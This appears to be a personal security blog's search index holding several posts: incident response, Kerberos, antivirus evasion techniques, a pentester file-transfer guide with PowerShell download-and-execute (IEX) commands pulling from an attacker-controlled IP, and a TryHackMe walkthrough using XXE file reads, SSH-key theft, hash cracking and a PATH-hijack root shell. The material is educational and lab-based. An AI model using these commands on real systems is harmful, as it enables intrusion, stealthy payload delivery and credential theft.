cyberattack.\ninvestigating which data may have been stolen.\ncontaining and securing compromised systems to prevent further damage.\nworking with stakeholders to determine incident response plan.\nthis role involves ensuring all steps of a data exposure management plan are completed.\nreviewing applicable privacy laws with the General counsel and creating plans of action to ensure that the laws are adhered to.\nthe Incident Response Coordinator will update the CISO and members about new events as they take place.\nprovide guidance and directing effort in information gathering and documentation.\ngathering and documenting findings of security systems.\ndocumenting procedural information and appropriate data for Incident Management.\nproviding expert opinions in data and technology.\nThe ERT consists of officials with the authority to make key decisions in Incident Response.\nMay consist of CISO, privacy officer, General Counsel, Representative(s) from the Office of the President, and head of the organization where the cyber incident occurred.\n1. Preparation Make sure there are people on the incident response team Make sure the team is trained and has access to the services that they would need in the case of an incident Have drills simulating an attack Create a plan/playbook for the Security Operations team containing steps and actions to take when compromised. 2. Identification Find ways to detect deviations in the regular functioning of an application Software for this can include:\nIDS/IPS Security Incident Event Manager (SIEM) Endpoint detection \u0026amp; response (EDR) Alerts will typically be addressed by a Security Operations Center (SOC) analyst who will assess whether there is a threat or a false alarm.\nSuspicious behavior might include:\nUnusual behavior from privileged attacks Unauthorized users trying to access servers and data Anomalies in outbound network traffic Traffic sent to or from unknown locations Excessive consumption of computing resources. Can be a sign of cryptojacking or running a heavy program Changes in configuration Hidden files Unexpected changes like users getting locked out of their accounts or memberships changing Suspicious registry entries Identify where the attacker initially got in.\nIdentify what programs were uploaded, which files were changed, which new processes are running, and if any new registry keys were created.\n3. Containment\nPrevent any further damage from occurring by containing it. Short-term containment is isolating the affected devices from the rest of the network. Long-term containment may involve taking an image of the device and performing hard-disk forensics. For this you would want a Digital forensics analyst. This can be necessary when a deeper analysis is required. 4. Eradication\nUndoing the changes that the adversary made Installing patches Disarming malware Disabling compromised accounts 5. Recovery\nReturn to normal service in the business. If clean backups are available, these can be used to restore service Compromised devices will need rebuilding to ensure recovery Affected devices may need additional monitoring 6. Lessons learned\nThis is the final stage of incident response. Have a post-incident review (PIR), or a meeting where representatives from each team discuss what went well and what could be improved. This is where the incident response plan can be refined. References https://docs.microsoft.com/en-us/security/compass/incident-response-planning https://www.varonis.com/blog/incident-response-plan https://security.uconn.edu/incident-response-plan/ ","permalink":"https://ally-petitt.com/en/posts/2022-07-09_how-companies-respond-to-cyber-attacks---the-6-steps-of-an-incident-response-plan-9c6f4267253e/","summary":"Introduction This article contains information that I have gathered as I’ve done research on incident response. This aims to be actionable for red teamers to know what to look out for and for blue teamers to aid in the creation of an effective incident response plan.\nKey Roles the CISO ensures cyberattacks are promptly investigated.\ncoordinating efforts of incident response during a cyberattack.\ninvestigating which data may have been stolen.","title":"How Companies Respond to Cyber Attacks | The 6 Steps of an Incident Response Plan"},{"content":" Foreword To avoid detection, it is best to use tools that are native to the victim’s computer.\nFTP with Windows Host While having a shell on the Windows machine, start an FTP server on your host machine. Follow these steps if you don’t already have FTP server installed:\nsudo apt-get install vsftpd sudo service vsftpd start service vsftpd status #status should be active To check if your server is working, type ftp localhost. If you see the message “Connected to localhost”, your FTP server is running.\nAccessing File With Interactive Shell If you have an interactive shell on the Windows machine, run this command.\ncscript wget.vbs http://\u0026lt;YOUR IP\u0026gt;/\u0026lt;PATH TO FILE\u0026gt; \u0026lt;FILENAME TO SAVE AS\u0026gt; Accessing File With Non-Interactive Shell If you don’t have an interactive shell, you can’t start PowerShell.exe. A workaround is to create a PowerShell script and execute it:\necho $storageDir = $pwd \u0026gt; wget.ps1 echo $webclient = New-Object System.Net.WebClient \u0026gt;\u0026gt;wget.ps1 echo $url = \u0026#34;http://\u0026lt;YOUR IP\u0026gt;/\u0026lt;PATH TO FILE\u0026gt;\u0026#34; \u0026gt;\u0026gt;wget.ps1 echo $file = \u0026#34;output-file.exe\u0026#34; \u0026gt;\u0026gt;wget.ps1 echo $webclient.DownloadFile($url,$file) \u0026gt;\u0026gt;wget.ps1 To invokewget.ps1, call\npowershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 -ExecutionPolicy Bypass -noLogo -NonInteractive --- stealthly powershell -c \u0026#34;(new-object System.Net.WebClient).DownloadFile(\u0026#39;http://\u0026lt;YOUR IP\u0026gt;/\u0026lt;FILENAME\u0026gt;\u0026#39;)\u0026#34; IEX(New-Object Net.WebClient).downloadString(\u0026#39;http://\u0026lt;YOUR IP\u0026gt;/\u0026lt;FILENAME\u0026gt;\u0026#39;) Getting Files Through PowerShell On your Kali Linux machine, make a copy of the file you want to send to /var/www/html/ . On the Window’s machine, execute the following:\npowershell -c \u0026#34;(new-object System.Net.WebClient).DownloadFile(\u0026#39;http://192.168.10.128/unko.txt\u0026#39;,\u0026#39;C:\\Users\\Administrator\\Desktop\\transferme.txt\u0026#39;)\u0026#34; powershell -c \u0026#34;(new-object System.Net.WebClient).DownloadFile(\u0026#39;http://192.168.119.146/gori.ps1\u0026#39;)\u0026#34; File Transfer With SMB Method 1 Get smbserver.pyfrom Impacket and run the following on your Kali Linux machine:\nsmbserver.py gori $(pwd) -smb2support -user gori -pass gorigori Run this on the victim’s machine:\nNew-PSDrive -Name \u0026#34;gori\u0026#34; -PSProvider \u0026#34;FileSystem\u0026#34; -gori \u0026#34;\\\\\u0026lt;YOUR IP\u0026gt;\\gori\u0026#34; Method 2 Run this on your Kali machine:\nsmbserver.py kali . Run this on the victim’s machine:\nOn victim\u0026#39;s \\\\\u0026lt;YOUR IP ADDRESS\u0026gt;\\kali\\FILE\\_NAME.exe \u0026#34;whoami\u0026#34; # \u0026#34;whoami\u0026#34; confirms that it is running File Transfer With an HTTP Server On your machine run:\npython3 -m http.server 80 This will start an HTTP server on port 80 with the root of the HTTP server being in the directory that you executed the command from. To get a file, run this on the victim’s machine:\nwget http://\u0026lt;YOUR IP\u0026gt;/path/to/file.txt File Transfer with SCP and RSYNC Both of these methods of file transfer occur over SSH. Secure Copy Protocol (SCP) is being deprecated, however, if you’re able to use it, the syntax is fairly simple.\nscp \u0026lt;SOURCE\u0026gt; \u0026lt;DESTINATION\u0026gt; In this example, we are using SCP to copy a file from a remote host to the working directory of our local machine such that our computer is on the receiving end.\nscp username@ip_address:/home/username/filename If you are looking to transfer a file from your computer to the remote host, the following syntax can be used:\nscp filename username@ip_address:/home/username The same commands can be used with RYSNC by simply replacing scp with rsync .\nrsync \u0026lt;SOURCE\u0026gt; \u0026lt;DESTINATION\u0026gt; Conclusion There are countless ways to transfer files between two computers. Among the most common methods are HTTP and FTP, but if those don’t work, there is a chance that some of the other options here will. Some honorable mentions that I didn’t go into detail on are SSHFS, SFTP, Winscp, and Samba. I hope that you were able to find value in this article and remember to never stop learning.\n","permalink":"https://ally-petitt.com/en/posts/2022-06-08_pentester-s-guide-to-performing-file-transfers-3c1a6a38dfc8/","summary":"Foreword To avoid detection, it is best to use tools that are native to the victim’s computer.\nFTP with Windows Host While having a shell on the Windows machine, start an FTP server on your host machine. Follow these steps if you don’t already have FTP server installed:\nsudo apt-get install vsftpd sudo service vsftpd start service vsftpd status #status should be active To check if your server is working, type ftp localhost.","title":"Pentester’s Guide to Performing File Transfers"},{"content":" How Does Antivirus Software Actually Work? Antivirus software acts as a defense from trojans, viruses, ransomware, spyware, adware, and much more. There are 3 main ways that it detects malware: signature-based detection, heuristic-based detection, and anomaly-based detection.\nSignature-Based Detection The scanner will search for specific strings in a program and check for them in a database of known viruses. The strings are often the payload of the malicious code. If the signatures match, the activity is flagged for suspicious activity. Many of these databases store over 250,000 different signatures.\nDownsides to this approach:\nThe database only stores the values of known signatures Newer variations of malware may go undetected if their new signature is not stored in the database Viruses can be easily and quickly altered to change their signature Anomaly-Based Detection Instead of referencing a static database that needs to be continuously updated, this type of detection checks the running program for patterns of . This can be referred to as an expert system. Often, these detection systems will utilize a machine learning model that was trained using data from the past years of the company using the antivirus software.\nHeuristic-Based Detection This is one of the few methods capable of detecting polymorphic viruses. Heuristic analysis may consist of multiple different methods, including static heuristic analysis. This technique deals with decompiling a program and comparing the source code to the source code of known viruses stored in a database.\nAdditionally, heuristic analysis may include dynamic heuristics, a method of containing the program in a virtual machine to test what happens when the code is executed. The running program is monitored for suspicious activity such as overwriting files or self-replication.\nHow to Evade Antivirus Detection On-Disk Evasion The following are techniques used for on-disk evasion:\nObfuscation- this method involves rewriting the code to appear more confusing and harder to read. Cryptography- the code will be encrypted with the decryption key stored in a stub. The program will be decrypted in memory. Packing- the code is condensed into a smaller binary file which results in a different signature on the payload. Encoding- the payload may be encoded as base64, hexadecimal, or other types of encodings. In-Memory Evasion The following is a technique used for in-memory evasion:\nUse Windows APIs to inject a payload into a running process Payload is executed in the memory of running process in a separate thread Command-Line Tools Here is a list of tools that can help craft undetectable payloads to bypass the antivirus software:\nVeil-Evasion Shellter Invoke-Obfuscation Going Deeper Here are some resources for those who are looking for a deeper understanding of antivirus evasion.\nVeil-Evasion Complete Tutorial Defense Evasion — Red Team Notes 2.0 Malware Analysis Bootcamp - Extracting Strings ATT\u0026amp;CK Deep Dive: Defense Evasion Windows Red Team Defense Evasion Techniques ","permalink":"https://ally-petitt.com/en/posts/2022-05-30_antivirus-evasion--what-it-is-and-how-to-do-it-17f98e920704/","summary":"How Does Antivirus Software Actually Work? Antivirus software acts as a defense from trojans, viruses, ransomware, spyware, adware, and much more. There are 3 main ways that it detects malware: signature-based detection, heuristic-based detection, and anomaly-based detection.\nSignature-Based Detection The scanner will search for specific strings in a program and check for them in a database of known viruses. The strings are often the payload of the malicious code. If the signatures match, the activity is flagged for suspicious activity.","title":"Antivirus Evasion: What it is and How to do it"},{"content":" When first learning Kerberos, it can feel like you’re being chased by the three-headed dog. Not to fear, however, because today I’ll be explaining a high-level overview of Kerberos authentication. Kerberos was designed to provide secure authentication to services over a potentially insecure network. It is used by many organizations to implement single sign-on (SSO).\nKerberos Terminology In order to understand the step-by-step explanation, it is important to have a basic understanding of the various components of Kerberos.\nKerberos Realm- the domain in which Kerberos has the ability to authenticate a user Principal- A unique identity within a Realm that represents either a user or service Client- The user that is trying to access a service Service- A resource provided to a client (eg. a file server, application, etc.) Key Distribution Center (KDC)- Supplies tickets and generates temporary session keys that allow a user to securely authenticate to a service. It also stores the secret symmetric keys for all of the users and services Authentication Server- ensures that the client making the request to the service is a known user. It then issues a ticket-granting ticket Ticket Granting Server- ensures that the user is making a request to a known service and grants service tickets How Kerberos Works The user sends an unencrypted message to the Authentication server requesting to access a service The Authentication server validates that the request came from a known user and generates a ticket-granting ticket (a ticket that allows you to be granted a ticket by the Ticket Granting Server) The Ticket Granting Ticket (TGT) is sent to the user alongside a message encrypted with the user’s secret key The user uses their secret key to decrypt the message and generates new messages. The user sends their new messages and the TGT that they received (step 3) to the Ticket Granting Server The Ticket Granting Server decrypts the Ticket Granting Ticket and does validation. Then, it creates a service ticket and a new encrypted message back to the user The user decrypts the message and creates an Authenticator message. The user Authenticator and the service ticket is finally sent to the service. The service decrypts and validates the service ticket and Authenticator message. Then, it sends back its own Authenticator message to the user. To paraphrase this, Kerberos makes sure that the user is legit, then it makes sure that the service is legit. Finally, a secure connection is created between the user and the service.\nKey Benefits of Using Kerberos Passwords are never sent across the network Encryption keys are never directly exchanged Mutual authentication between the client and the application Conclusion I hope that this overview cleared up some of the confusion around Kerberos authentication. Thank you for reading.\nMore Resources Kerberos Authentication Explained | A deep dive Kerberos (protocol) How Does Kerberos Work? The Authentication Protocol Explained ","permalink":"https://ally-petitt.com/en/posts/2022-05-25_kerberos-authentication-explained-3d45f336bb2c/","summary":"When first learning Kerberos, it can feel like you’re being chased by the three-headed dog. Not to fear, however, because today I’ll be explaining a high-level overview of Kerberos authentication. Kerberos was designed to provide secure authentication to services over a potentially insecure network. It is used by many organizations to implement single sign-on (SSO).\nKerberos Terminology In order to understand the step-by-step explanation, it is important to have a basic understanding of the various components of Kerberos.","title":"Kerberos Authentication Explained"},{"content":" Introduction Hey everyone! This is a write-up of how I was able to pwn the Mustacchio machine. I hope you enjoy!\nNotes: This was done on a Kali Linux machine so the commands might be slightly different if you are on Windows Enumeration To begin, I scanned for open ports using RustScan. RustScan, for those who have never heard of it, is essentially a much faster version of Nmap. You can use Nmap if you prefer. My results were as follows:\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu)) | http-robots.txt: 1 disallowed entry |_/ | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Mustacchio | Home 8765/tcp open http syn-ack nginx 1.10.3 (Ubuntu) |_http-server-header: nginx/1.10.3 (Ubuntu) |_http-title: Mustacchio | Login | http-methods: |_ Supported Methods: GET HEAD POST Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nAs shown by this scan, there are 3 ports open. I investigated the website on port 80 first. I looked through the source code, checked for cookies, looked for linked javascript files, and tested the contact form for cross-site scripting. I found nothing interesting, so I continued to do directory enumeration using FFUF (you can also use Wfuzz, Gobuster, or DirBuster for this part).\nffuf -u \u0026lt;http://10.10.93.193/FUZZ\u0026gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\nThe custom directory looks interesting. I noticed it earlier when I was looking at the linked JavaScript files. Let’s investigate.\nAnd we have access to these files! I went inside the JavaScript file and found a file called users.bak. I downloaded the file and ran the strings command on it.\n$ strings users.bak SQLite format 3 tableusersusers CREATE TABLE users(username text NOT NULL, password text NOT NULL) ]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b\nFrom this file, we have learned that they are using SQLite 3 to store their users. Now, we have a way to view the admin user in their database. Great! Before we go deeper into this, I’d like to explore the other web server running on port 8765.\nHow great is this! We found the admin panel where we can log in as admin. Let’s see if we can get the admin credentials using the users.bak file.\nExploitation After a few Google searches, I found out how to open this file. I used the SQLite3 CLI:\n$ sqlite3 users.bak SQLite version 3.36.0 2021–06–18 18:36:39 Enter “.help” for usage hints. sqlite\u0026gt; .tables users sqlite\u0026gt; .dump users PRAGMA foreign_keys=OFF; BEGIN TRANSACTION; CREATE TABLE users(username text NOT NULL, password text NOT NULL); INSERT INTO users VALUES(‘admin’,’1868e36a6d2b17d4c2745f1659433a54d4bc5f4b’); COMMIT;\nAnd there is the password hash that we found when we initially used the strings command on users.bak 😂. I tried to use my best buddy John for help, but he failed me today. Instead, I resorted to hashcat to crack the password.\n$ hashcat -m 100 ./hash /usr/share/wordlists/rockyou.txt\nAnd we have our password! With the newfound credentials admin:bulldog19 I logged into the admin console on port 8765. Success! The credentials worked.\nWhile looking at the page source, two things immediately stand out to me.\nI see a comment left by the developer The name of the input box is “xml” When I try press submit without writing anything in the textarea, I am greeted by the following alert:\nInteresting. Maybe we can submit our own XML code to perform a reverse shell. One of the most common XML vulnerabilities is an XML Eternal Entity (XXE) injection, so let’s test for it in this application! I used the XXE payload from this blog post:\n`\u003c?xml version=”1.0\" encoding=”UTF-8\"?\u003e\n\u003c!DOCTYPE comment [\u003c!ENTITY xee SYSTEM “/etc/passwd”\u003e ]\u003e \u0026xee; ` When I type this in the text area and press “Submit”, I see the following on my screen:\nSuccess! This application is vulnerable to XXE injection. Let’s use this vulnerability to get our first flag.\nUser.txt Here, we can see Barry as a user on this machine. Recalling that we found a comment regarding his SSH key in the source code, maybe we can find his private key to gain SSH access to this server. To do this, I looked inside his .ssh folder inside his home directory. I simply changed /etc/passwd to /home/barry/.ssh/id_rsa as \u0026ldquo;id_rsa\u0026rdquo; is a common name for the file containing a private ssh key.\nSuccess! We can now see Barry’s private SSH key. If we were to directly copy-paste this from the webpage we would have formatting issues. Instead, I inspected the page and copied the key from the HTML. I then pasted it into a file called “id_rsa_barry”, making sure that there is no white space. I changed the permissions on the file using this command:\nchmod 400 id_rsa_barry\nI went to ssh into the machine and this was my result:\nIt seems that we need a passphrase. The passphrase should be within the private SSH key file, which we can crack using John.\n$ python3 /usr/share/john/ssh2john.py id_rsa_barry \u0026gt; id_rsa_barry.hash $ john — wordlist=/usr/share/wordlists/rockyou.txt id_rsa_barry.hash\nGreat! Now we have the passphrase to use. I used the same ssh command from before to log in and entered the passphrase that I just found. And we are in.\nPrivilege Escalation First, I took a look at Barry’s id.\nbarry@mustacchio:~$ id uid=1003(barry) gid=1003(barry) groups=1003(barry)\nIt appears that he is not in any groups that we could use for privilege escalation. I also used sudo -l to see if there are any commands that we can run as root without a password. This turned out not to be the case. Then, I checked for any SUID binaries. These are files that can run with root privileges.\nbarry@mustacchio:~$ find / -perm -4000 2\u0026gt;/dev/null /usr/lib/x86\\_64-linux-gnu/lxc/lxc-user-nic /usr/lib/eject/dmcrypt-get-device /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/snapd/snap-confine /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/bin/passwd /usr/bin/pkexec /usr/bin/chfn /usr/bin/newgrp /usr/bin/at /usr/bin/chsh /usr/bin/newgidmap /usr/bin/sudo /usr/bin/newuidmap /usr/bin/gpasswd **/home/joe/live\\_log** /bin/ping /bin/ping6 /bin/umount /bin/mount /bin/fusermount /bin/su Interesting, “live_log” is in Joe’s home directory. Maybe we have permission to execute it.\nbarry@mustacchio:~$ cd /home/joe \u0026amp;\u0026amp; ls -la total 28 drwxr-xr-x 2 joe joe 4096 Jun 12 2021 . drwxr-xr-x 4 root root 4096 Jun 12 2021 .. -rwsr-xr-x 1 root root 16832 Jun 12 2021 live_log\nAnd we do! When I run it, it appears to launch an application.\nThis isn’t very useful to us because we can’t interact with the application! Instead, I looked further into the file using the strings command. Additionally, I used awk so that we would only see the long strings that are more likely to be helpful. If nothing useful came out, then I would lower the minimum string length from 15 characters to 10 and so on because the output can often be very long.\n$ strings live_log | awk ‘length($0) \u0026gt; 15’\nInteresting. There is a path to “access.log” and the full path for the tail command isn’t used. Maybe we can change the PATH variable so that we can use our own “tail” command that gives us root.\n`$ export PATH=/tmp\n$ cd /tmp\n$ echo “/bin/bash -p” \u0026gt; tail\n$ /bin/chmod +x tail\n$ /home/joe/live_log\n/usr/bin/whoami root\n/bin/cat /root/root.txt [REDACTED]`\nAnd it works! Since “live_log” was an SUID binary, we were able to run it as root. We were able to redirect the path from /usr/bin/tail to /tmp/tail which allowed us to run /bin/bash as root, giving us a root shell.\nThat’s all! I hope you enjoyed my explanations. Please send me any constructive feedback via LinkedIn. Thank you and take care!\n","permalink":"https://ally-petitt.com/en/posts/2022-02-18_mustacchio-walkthrough---try-hack-me---ally-petitt-6295dfbbfb1b/","summary":"Introduction Hey everyone! This is a write-up of how I was able to pwn the Mustacchio machine. I hope you enjoy!\nNotes: This was done on a Kali Linux machine so the commands might be slightly different if you are on Windows Enumeration To begin, I scanned for open ports using RustScan. RustScan, for those who have never heard of it, is essentially a much faster version of Nmap. You can use Nmap if you prefer.","title":"Mustacchio Walkthrough | Try Hack Me | Ally Petitt"},{"content":"High school student by day, hacker by night.\n","permalink":"https://ally-petitt.com/en/about-me/","summary":"about me","title":"About me"}]